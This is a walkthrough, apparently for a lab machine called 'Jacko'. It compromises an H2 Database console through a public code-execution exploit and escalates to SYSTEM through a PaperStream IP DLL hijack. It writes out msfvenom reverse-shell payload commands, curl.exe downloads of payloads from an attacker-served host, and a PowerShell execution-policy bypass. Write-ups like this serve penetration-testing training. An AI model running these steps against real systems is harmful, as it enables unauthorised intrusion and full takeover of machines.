Jacko

Target IP: 192.168.45.160

A machine best paired with a nice cup of coffee.

Reconnaissance


There are multiple TCP ports open on the target machine, as shown above.


Performing an aggressive nmap scan returns the result above, as shown above. There seems to be an interesting database application on port 80 and 8082. I will start enumeration with the application on port 80.

Enumeration

Port 80: HTTP

Browsing to port 80 displays the webpage above. It contains information about the H2 Database Engine application that is running on port 8082. I performed some directory search but I did not find anything useful. Time to enumerate the Java SQL database application on port 8082.

Port 8082: H2 Database HTTP Console

Browsing to this port displays the application interface above. The username sa is already saved, but it looks like this user does not contain a password.


Pressing the Connect button from the previous image displays the interface above. Is this user an admin?


Running the SQL query SELECT * FROM INFORMATION_SCHEMA.USERS shows the result above. It looks like this user is the admin, and only user in this database. I successfully managed to create tables using this user. Can I backdoor this webserver?


Using the SQL syntax SELECT H2VERSION() as Version FROM DUAL, I managed to find out the version of the application. The target is running the version 1.4.199.


And doing a Google search for public exploits for this application shows it is vulnerable to code execution. The verified exploit in the picture above looks interesting and I can run it against the target machine. This exploit also contains the PoC in order to achieve code execution.

Exploitation


The exploit I found contains the description above. Basically the code execution is achieved by compiling and running the Java code, but the Java compiler must be installed on the target machine.


I sent the command ipconfig /all using the PoC exploit, and obtained the result above. It looks like the hostname is jacko.


Sending the command systeminfo returns the juicy information above about the target machine. It looks like it is running Windows 10 Pro. The Hotfixes are also returned! Time to obtain a reverse shell connection now. From previous enumeration, the current user that is logged into the system is tony. Maybe I can save the shell at directory of user tony?


I generated a x64 Windows reverse shell payload using the command msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.160 LPORT=80 -f exe -o shell.exe with the name as shell.exe. Then I started a Python HTTP server on port 8080 to serve this malicious executable to the target machine.


Since the target machine is running Windows, I used the command curl.exe --output c:/users/tony/desktop/shell.exe --url http://192.168.45.160:8080/shell.exe to download the shell and save it at Desktop of user tony. And to excute this malicious shell, I used the command c:/users/tony/desktop/shell.exe.


Now I have a reverse shell connection from the target machine on my machine at port 80. However, the target machine cannot execute commands. Is the PATH environmental variable correct?


Running path returns PATH=C:\Users\tony\AppData\Local\Microsoft\WindowsApps;, and this is incorrect. I fixed this path by using the following command set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;. In the picture above, I can now perform commands on the target machine. Now I have a foothold on the target machine.

Privilege Escalation


After some enumeration, I found an interesting application located at C:\Program Files (x86)\PaperStream IP called PaperStream IP 1.42 as shown above. I obtained the application version through the file readmeenu.rtf.


Doing a Google search for public exploits for this PaperStream IP 1.42 shows it is vulnerable to local privilege escalation. The exploit above exploit a DLL hijack vulnerability to obtain a nt authority\system access. This exploit also contains the PoC to generate a malicious dll. I generated this DLL using the command msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.160 LPORT=445. I also downloaded the exploit above on my machine. Time to serve this to the target machine.


I saved the Powershell exploit as 49382.ps1. Then I changed the location of the payload file at line 22 to point to the malicious DLL, as shown above.


Then using the commands below, I downloaded the malicious DLL and Powershell exploit on the target machine. I also started a listener on port 445 for this exploit.
curl.exe --output c:/users/tony/desktop/UninOldIS.dll --url http://192.168.45.160:8080/UninOldIS.dll
curl.exe --output c:/users/tony/desktop/49382.ps1 --url http://192.168.45.160:8080/49382.ps1


And firing the exploit using the command C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\users\tony\Desktop\49382.ps1 worked! Now I have an nt authority\system access on the target machine, meaning I have full access over the machine.
